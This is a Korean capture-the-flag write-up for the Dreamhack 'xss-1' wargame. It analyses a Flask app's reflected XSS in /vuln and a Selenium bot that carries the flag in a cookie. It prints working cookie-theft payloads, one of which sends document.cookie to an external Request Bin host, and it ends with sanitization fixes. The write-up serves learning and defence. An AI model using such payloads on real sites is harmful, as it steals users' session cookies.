# 서론

`xss-1` 워게임은 다른 이용자의 클라이언트(브라우저)에 저장된 쿠키를 탈취하는 것이 목표이다.

이번 문제는 파이썬 `Flask` 프레임 워크로 구현되어 있기 때문에, 지금은 아직 `Flask` 공부가 안되있어서 [풀이](https://learn.dreamhack.io/184)를 봤지만 다음에는 공부를 해서 풀어보자.

이 문제에서 `XSS`를 통해 다른 이용자의 쿠키를 탈취해야하는데, 이를 위해서는 다른 이용자가 방문하는 시나리오가 필요하다. 이 기능은 [셀레늄(Seleninum)](https://selenium-python.readthedocs.io/getting-started.html)을 통해 구현되어 있다.\
(이것도 나중에 더 공부하자.)

`셀레늄`은 웹 애플리케이션 테스팅에 사용되는 `Python Module`이고, `API`를 통해 `웹 드라이버(크롬, 사파리 등)`를 사용할 수 있다. 셀레늄은 요청과 응답만을 처리하는 라이브러리와는 다르다.

셀레늄은 응답에 포함된 `JS, CSS`와 같은 웹 리소스를 웹 드라이버를 통해 해석하고 실행하기 때문에 웹 브라우저를 통해 페이지를 방문하는 것과 같은 역할을 한다.

### 문제 목표 및 기능 요약

`xss-1`의 문제 목표는 `XSS`를 통해 이용자의 쿠키를 탈취하는 것이다. 각 페이지의 기능은 아래와 같다.

| **페이지** | **설명** |
|------------|----------|
| `/`        | 인덱스 페이지이다. |
| `/vuln`    | 이용자가 입력한 값을 출력한다. |
| `/memo`    | 이용자가 메모를 남길 수 있으며, 작성한 메모를 출력한다. |
| `/flag`    | 전달된 URL에 임의 이용자가 접속하게끔 한다. **해당 이용자의 쿠키에는 FLAG가 존재**한다. |

# 웹 서비스 분석

엔드 포인트는 지금은 페이지라고 간단하게 생각하면 된다.

## 엔드포인트 : `/vuln` 

```
@app.route("/vuln")
def vuln():
    param = request.args.get("param", "") # 이용자가 입력한 vuln 인자를 가져옴 : URL에서 `"param"` 문자열의 값을 찾고, 없으면 `""` 공백을 저장
    return param # 이용자의 입력값을 화면 상에 표시
```

코드를 살펴보면, 이용자가 전달한 `"param"`에 해당하는 파라미터 값을 `param`에 저장하여 출력한다. `Flask`에서 `return`을 하면 브라우저에 출력되는 것 같다.

참고로, `@app.route("/vuln")`는 `/vuln` 경로로 들어오는 `HTTP GET` 요청을 처리하도록 설정한다.

## 엔드포인트: `/memo`

```
memo_text = ""

@app.route("/memo") # memo 페이지 라우팅
def memo(): # memo 함수 선언
    global memo_text # 메모를 전역변수로 참조
    text = request.args.get("memo", "") # 이용자가 전송한 memo 입력값을 가져옴
    memo_text += text + "\n" # 이용자가 전송한 memo 입력값을 memo_text에 추가
    return render_template("memo.html", memo=memo_text) # 사이트에 기록된 memo_text를 화면에 출력
```

코드를 살펴보면, 이용자가 전달한 `"memo"`에 해당하는 파라미터 값을 `text`에 저장하고, `memo_text` 변수에 개행문자와 함께 추가한다.

이후, `render_templete` 함수를 통해 기록하고 이를 출력한다. **`/vuln`과 달리 `render_templete` 함수를 통해 리턴하면 내용이 `HTML entity`로 변환되어 전달된다.**


## 엔드포인트: `/flag`

```
@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html")
    elif request.method == "POST":
        param = request.form.get("param")
        if not check_xss(param, {"name": "flag", "value": FLAG.strip()}):
            return '<script>alert("wrong??");history.go(-1);</script>'
        return '<script>alert("good");history.go(-1);</script>'
```

코드를 살펴보면, `methods`에 따라 다른 기능을 수행하는 것을 알 수 있다. (`methods=["GET", "POST"]`는 이 엔드포인터가 `GET`, `POST` 두가지 HTTP 메서드를 처리할 수 있다는 것이다.)

### `GET`

이용자에게 URL을 입력받는 페이지인 `flag.html` 페이지를 제공한다.

### `POST`

먼저, POST 요청의 본문에 포함된 `"param"`이라는 이름의 폼 데이터를을 가져온다. `/flag` 엔트리 포인트에서 `<form>` 태그로 입력을 받기 때문이다.

그리고, `check_xss(param, {"name": "flag", "value": FLAG.strip()})` 함수는 `XSS` 공격을 탐지하기 위해 사용되는데, 

`param`은 사용자가 입력한 값이고, 두 번째 인수는 검사에 필요한 추가 정보인 `{"name": "flag", "value": FLAG.strip()}`이다.

여기서 `FLAG.strip()`은 실제 플래그인 `FLAG` 값에서 앞뒤 공백을 제거한 것이다. 만약 이 함수가 `False`를 반환한다면(즉, XSS 공격이 의심될 경우), 브라우저에 'wrong??'이라는 경고를 띄우고 사용자를 이전 페이지로 되돌려 보낸다.

```
def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        service = Service(executable_path="/chromedriver")
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome(service=service, options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(url)
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True
    
def check_xss(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    return read_url(url, cookie)
```

그리고 `check_xss` 함수 내에서는 `url`을 `/vuln` 엔드포인터로 설정한 후, `param`의 파라미터 값을 `URL` 인코딩 해서 설정한후, `read_url(url, cookie)`를 호출한다.

쿠키에 플래그가 저장되어 있는 이유가 여기서 알 수 있듯이 `/flag` 엔드포인트에서 `check_xss`를 호출할 때, `cookie`의 `value`로 플래그를 전달해주고, `read_url`에서 해당 값을 쿠키로 설정하기 때문이다.

**뒤에서 더 설명하겠지만, `check_xss`는 `XSS` 공격이 발생할 때, `false`를 리턴해야하지만 `\vuln` 엔드 포인트에 `XSS` 취약점이 존재하기 때문에 제대로 검사가 되지 않아서 항상 `true`가 리턴된다.**

`read_url` 함수는 쿠키를 세팅하고, **셀레니움을 통해 서버가** `url`로 접속하는 시뮬레이션을 해주는 함수라고 생각하자.

# 취약점 분석

`/vuln`과 `/memo` 엔드 포인트는 이용자의 입력 값을 `return`을 통해 페이지에 출력한다. `/memo`는 `render_templete` 함수를 통해 `memo.html`을 출력하며 `memo` 파라미터를 템플릿 변수로 전달해주는데,

`render_templete` 함수는 전달된 템플릿 변수를 기록할 때, `HTML entity` 코드로 변환하여 저장하기 `<script>` 코드가 전달되도 코드로 해석되지 않기 때문에 `XSS`가 발생하지 않는다.

그러나, `/vuln`은 `param`을 그대로 출력하기 때문에 `XSS`가 발생한다.

# Exploit

위에서 분석한 `/vuln` 엔드 포인트의 취약점을 활용하여 **임의 이용자의 쿠키**를 탈취해야 한다. (나의 쿠키가 아닌 **임의 사용자**의 쿠키이므로 임의 사용자가 접속하도록 해야한다.)

탈취한 쿠키를 전달받기 위해서는 **외부에서 접근 가능한 웹 서버**를 사용하거나, 문제에서 제공하는 **`/memo` 엔드 포인트**를 사용할 수 있다.

`http://`를 붙여서 전체 URL을 바꾸거나, 현재 경로를 기준으로 하는 상대 경로만 바꿀 수도 있는 `location.href`와 사용자의 쿠키를 가지고 있는 `document.cookie` 를 사용하여 익스플로잇을 수행해보자.

## 1. `/memo` 엔드 포인트를 사용하는 법

현재 `index.html`의 코드에서 `/memo` 엔드 포인트에는 `hello` 파라미터로 전달 되기 때문에 `hello`가 출력되고 있다.

```
<p class="important"><a href="/vuln?param=<script>alert(1)</script>">vuln(xss) page</a></p>
<p class="important"><a href="/memo?memo=hello">memo</a></p>
<p class="important"><a href="/flag">flag</a></p>
```

<img width="997" alt="image" src="https://github.com/user-attachments/assets/51f07d84-65ea-4dda-8086-4479236d6c8e">

여기서, `/flag` 엔드 포인트에서 폼에 `<script>location.href = "/memo?memo =" + document.cookie</script>`를 입력해서 제출해주는 상황을 생각해보자. 

이렇게 되면, `/flag`의 기존 동작에 따라 폼으로 입력 받은 `param`을 통해 `/vuln` 엔드 포인트에 먼저 접속하여 `return param`을 수행하게 된다.

그럼 방금 `/flag`에서 `param`에 대입해준 스크립트 코드를 수행하게 되어서, 현재 URL이 `/memo` 엔드 포인트로 바뀌게 되고, 파라미터로 임의 이용자의 `cookie`가 전달되게 되어, 이를 통해 `memo.html` 파일이 출력되게 된다.

```
{% block content %}
<pre>{{ memo }}</pre>
{% endblock %}
```

**참고로, 여기서 임의 이용자는 코드를 수행한 자신이 아닌 서버의 봇이기 때문에 `FLAG = open("./flag.txt", "r").read()`로 플래그를 읽어서 쿠키에 세팅하게 된다. (`XSS`의 상황과, 자신의 쿠키에는 플래그 정보가 없다는 것을 잘 생각하자.)**

`/vuln` 엔드 포인트에서 스크립트 코드가 실행되서 `location.href`가 `/memo`로 바뀌게 되면, 셀레니움에 의해 서버에서 `/memo`에 방문하는 시뮬레이션을 발생시켜, 플래그가 존재하는 쿠키가 `memo_text`에 추가되게 된다.

플래그를 사용자도 볼 수 있고, `hello`가 게속 누적되는 이유는 `memo`의 텍스트가 계속 누적되는 이유는 `memo` 파라미터를 저장하는 `memo_text`가 전역 변수로 계속 더해지기 때문이다.

<img width="976" alt="image" src="https://github.com/user-attachments/assets/eceb0fca-6060-4fd3-8965-8aee680d87ea">

### 잘못했던 생각

처음에 잘못했던 생각이, 바로 `/flag` 에서 `<script>document.cookie</script>` 를 해주면 인덱스 페이지를 통해 `/vuln`에 접근할 때, 바로 `document.cookie`가 출력되는게 아닌가라는 생각을 했는데,

`read_url`을 통해서 `/vuln`에 접근하는 것은 폼을 입력한 현재 클라이언트가 아니라, `XSS` 공격에서 임의 이용자 역할을 하는 셀레니움이기 때문에 사용자에게는 아무 영향이 없다.

따라서, 사용자가 인덱스 페이지에서 `/vuln`에 접근해서 할 수 있는 것은 `alert(1);`코드를 수행하는 것 뿐이며, `URL`을 통해 `http://host3.dreamhack.games:21913/vuln?param=<script>document.cookie<script>`로 접속해도, 이 쿠키는 세팅되지 않은 현재 클라이언트의 쿠키이기 때문에 아무 값도 출력되지 않는다.

따라서, 셀리니움을 통해서 서버 측에서 `/vuln`에 접근하여, 폼으로 전달한 스크립트 코드를 실행하게 하는 시뮬레이션을 발생시켜서 `/memo`로 후 `memo_text`에 플래그를 더해서 현재 클라이언트에게도 보이도록 해야한다.

## 웹 서버 사용

외부에서 접근 가능한 웹 서버를 통해 탈취한 쿠키를 확인할 수 있다. 외부에서 접근 가능한 웹 서버가 없다면 [드림핵 툴즈 서비스](https://tools.dreamhack.games/)의 `Reqeust Bin` 기능을 이용하여 대체할 수 있다.

`Request Bin` 기능은 이용자의 접속 기록을 저장하기 때문에 웹 서버를 통해 탈취한 쿠키를 확인할 수 있다.

`Request Bin` 버튼을 클릭하면 랜덤한 `URL`이 생성되며, 해당 `URL`에 접속한 기록을 저장한다.

`/flag`에서 아래와 같은 코드를 입력하면, 아래 이미지와 같이 접속 기록에 포함된 플래그를 획득할 수 있다.

`<script>location.href = "http://RANDOMHOST.request.dreamhack.games/?memo=" + document.cookie;</script>`

이 스크립트를 입력해주면 셀레니움을 통해 서버가 해당 주소에 접속하여 `document.cookie` 값을 파라미터로 보내게 된다.

**사실 이 때는 셀레니움을 통해 서버가 워게임 UR의 `/memo`에 접근하여 쿠키를 `memo_text`에 더해주는 것이 아니라, 서버의 `document.cookie`를 `Request Bin`으로 생성한 랜덤한 주소에 접속하여 파라미터로 전달하는 것이기 떄문에,**

**`?memo =` 가 아니라 어떤 값으로도 써도 파라미터만 전달되면 상관없긴 하다. (`?asd =` 도 가능)**

<img width="1039" alt="image" src="https://github.com/user-attachments/assets/2b9f9718-b288-47b4-adc7-623e83363e38">

## 정리

이번 워게임을 통해 서버에서 이용자의 입력 값을 별다른 검증 없이 페이지에 출력할 경우 발생할 수 있는 `XSS` 취약점을 확인해볼 수 있었다.

`XSS` 공격은 주로 이용자의 입력 값이 출력되는 페이지에서 발생하며, 해당 공격을 통해 다른 이용자의 브라우저에 저장된 쿠키 및 세션 정보를 탈취할 수 있다.

이러한 취약점은 악성 태그를 필터링하는 `HTML Sanitization`을 사용하거나 `render_templete` 함수에서 사용한 방식처럼 `HTML entity` 코드로 입력 값을 치환하는 방법으로 해결할 수 있다.
